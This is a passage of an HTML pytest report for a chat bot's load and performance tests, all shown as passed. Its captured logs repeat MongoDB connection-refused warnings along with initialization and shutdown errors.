WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf364988ed7674ef4ee958, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf365688ed7674ef4ee959, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/performance/test_load_performance.py::TestLoadPerformance::test_config_validation_performance</td>
          <td class="col-duration">1.87</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/performance/test_load_performance.py::TestLoadPerformance::test_input_sanitization_performance</td>
          <td class="col-duration">0.02</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/performance/test_load_performance.py::TestLoadPerformance::test_memory_usage_under_load</td>
          <td class="col-duration">40.57</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>Memory growth: 0.12 MB
<br/> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf365d88ed7674ef4ee95a, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf366388ed7674ef4ee95b, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf366a88ed7674ef4ee95c, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf367388ed7674ef4ee95d, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf368088ed7674ef4ee95e, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/performance/test_load_performance.py::TestLoadPerformance::test_rate_limiting_performance</td>
          <td class="col-duration">40.23</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>Rate limiting overhead: -3.21%
<br/> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf368588ed7674ef4ee95f, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf368b88ed7674ef4ee960, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf369288ed7674ef4ee961, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf369b88ed7674ef4ee962, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf36a888ed7674ef4ee963, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/performance/test_load_performance.py::TestLoadPerformance::test_long_running_stability</td>
          <td class="col-duration">70.17</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>Processed 2683 messages with 0 errors in 30 seconds
Error rate: 0.00%
<br/> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf36ae88ed7674ef4ee964, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf36b488ed7674ef4ee965, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf36bb88ed7674ef4ee966, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf36c488ed7674ef4ee967, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf36d188ed7674ef4ee968, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/performance/test_load_performance.py::TestLoadPerformance::test_startup_time_performance</td>
          <td class="col-duration">281.08</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf36f488ed7674ef4ee969, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf36fa88ed7674ef4ee96a, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf370188ed7674ef4ee96b, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf370a88ed7674ef4ee96c, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf371788ed7674ef4ee96d, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize
ERROR    src.utils.errors:errors.py:125 Error occurred: Polling is not started
ERROR    src.core.application:application.py:184 Error during bot shutdown: An unexpected error occurred. Please try again or contact support.
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf371c88ed7674ef4ee96e, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf372288ed7674ef4ee96f, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf372988ed7674ef4ee970, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf373288ed7674ef4ee971, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf373f88ed7674ef4ee972, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize
ERROR    src.utils.errors:errors.py:125 Error occurred: Polling is not started
ERROR    src.core.application:application.py:184 Error during bot shutdown: An unexpected error occurred. Please try again or contact support.
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf374488ed7674ef4ee973, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf374a88ed7674ef4ee974, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf375188ed7674ef4ee975, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf375a88ed7674ef4ee976, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf376788ed7674ef4ee977, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize
ERROR    src.utils.errors:errors.py:125 Error occurred: Polling is not started
ERROR    src.core.application:application.py:184 Error during bot shutdown: An unexpected error occurred. Please try again or contact support.
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf376c88ed7674ef4ee978, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf377288ed7674ef4ee979, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf377988ed7674ef4ee97a, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf378288ed7674ef4ee97b, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf378f88ed7674ef4ee97c, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize
ERROR    src.utils.errors:errors.py:125 Error occurred: Polling is not started
ERROR    src.core.application:application.py:184 Error during bot shutdown: An unexpected error occurred. Please try again or contact support.
